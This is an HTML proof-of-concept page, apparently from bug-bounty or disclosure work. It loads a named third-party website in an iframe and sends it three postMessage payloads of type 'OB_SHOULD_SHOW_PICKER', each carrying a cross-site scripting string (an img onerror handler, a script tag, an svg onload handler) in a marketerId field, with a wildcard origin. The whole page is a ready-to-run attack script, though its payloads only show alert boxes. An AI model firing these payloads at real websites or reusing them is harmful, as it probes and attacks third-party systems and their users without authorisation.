<!DOCTYPE html>
<html>
  <head>
    <title>Syfe PoC</title>
  </head>
  <body>
    <h1>‚úÖ PoC: Send postMessage</h1>
    <iframe id="target" src="https://thebrowser.company/" width="100%" height="600"></iframe>

    <script>
      const iframe = document.getElementById("target");

      iframe.onload = () => {
        console.log("‚úÖ iframe loaded");

        const payloads = [
          {
            message: "OB_SHOULD_SHOW_PICKER",
            content: {
              marketerId: ["<img src=x onerror=alert(1)>"]
            }
          },
          {
            message: "OB_SHOULD_SHOW_PICKER",
            content: {
              marketerId: ["<script>alert(document.domain)</script>"]
            }
          },
          {
            message: "OB_SHOULD_SHOW_PICKER",
            content: {
              marketerId: ["<svg/onload=alert('xss')>"]
            }
          }
        ];

        console.log("üöÄ Sending fuzzed postMessage payloads...");
        payloads.forEach((p, i) => {
          console.log("üîÅ Fuzz #" + (i + 1), p);
          iframe.contentWindow.postMessage(p, "*");
        });
      };
    </script>
  </body>
</html>
